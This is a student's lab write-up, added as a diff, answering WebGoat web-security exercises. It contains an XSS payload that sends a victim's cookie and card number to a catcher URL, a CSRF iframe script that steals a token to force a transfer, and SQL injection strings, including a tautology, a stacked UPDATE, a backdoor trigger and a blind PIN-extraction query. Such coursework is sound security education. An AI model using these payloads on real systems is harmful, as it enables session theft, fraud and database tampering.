@@ -1,0 +1,59 @@
+#Baiwu Zhang, 1001127540, baiwu.zhang@mail.utoronto.ca
+#Haotian Yin, 1000669573, haotian.yin@mail.utoornto.ca 
+
+Part 1 Explanation:
+I created a new form where it asked the user for their creditials. Once the submit button is clicked, their credential will send to attacker's website.
+
+Part 2 Explanation:
+http://localhost:1079/WebGoat/start.mvc#attack/1406352188/900?field2=123&field1=<script>var purchaseButton=document.getElementsByName("purchase")[0];purchaseButton.addEventListener('click', function(){send();}, false);function send(){var cookie = document.cookie.split("=")[1];var creditNumber = document.getElementsByName("field2")[0].value;window.open('http://localhost:1079/WebGoat/catcher?PROPERTY=yes&cookie='+cookie+'&credit='+creditNumber);}</script>
+
+I created a function associated with the purshase button in the url. Once the purchase button is clicked, the script will acquire the current cookie and current credit card number and send it to the attacker's website. The field that is exploriable is the 'field1': three digit code section.
+
+Part 3 Explanation:
+Message part is exploitable.
+
+Part 4 Explanation:
+The field that’s exploitable is the message. 
+I created two frames, where the first frame contain the initial transaction page, and will call the second frame once it is called. The second frame will provide the with correct url to CONFIRM the purchase.
+
+
+Part 5 Explanation:
+<script>
+var token;
+function Frame1()
+{
+    var frameDoc = document.getElementById("frame1").contentDocument;
+    var form = frameDoc.getElementsByTagName("form")[0];
+    token = '&token=' + form.token.value;
+    Frame2();
+}
+function Frame2()
+{
+    var testFrame = document.getElementById("frame2");
+    testFrame.src="http://localhost:1079/WebGoat/attack?Screen= 803158781&menu=900&transfer=5000" + token;
+}
+</script>
+
+<iframe src="http://localhost:1079/WebGoat/attack?Screen= 803158781&menu=900&transfer=main"
+  onload="Frame1();"
+  id="frame1" frameborder="1" marginwidth="0"
+  marginheight="0" width="800" scrolling=yes height="300"></iframe>
+  
+<iframe id="frame2" frameborder="1" marginwidth="0"
+  marginheight="0" width="800" scrolling=yes height="300"></iframe>
+
+I created two frames, where the first frame contains the initial transaction page, stores the current token, and will call the second frame once it is called. The second frame will provide the token with correct url to complete the purchase.
+
+Part 6 Explanation:
+' or 1 = 1 --
+This command is always true thus will return all rows.
+
+Part 7 Explanation:
+101; UPDATE employee SET salary = 500500 WHERE userid = 101;
+101;CREATE TRIGGER myBackDoor BEFORE INSERT ON employee FOR EACH ROW BEGIN UPDATE employee SET email='ece568@utoronto.ca' WHERE userid = NEW.userid
+This part is self-explainable. 
+
+Part 8 Explanation:
+The number is 8546.
+101 AND ((SELECT pin FROM pins WHERE cc_number='1234123412341234') < 8547 );
+This previous command provide a way to assert whether the pin is in the range. Use this with binary search, we can quickly locate the correct pin to be 8546.
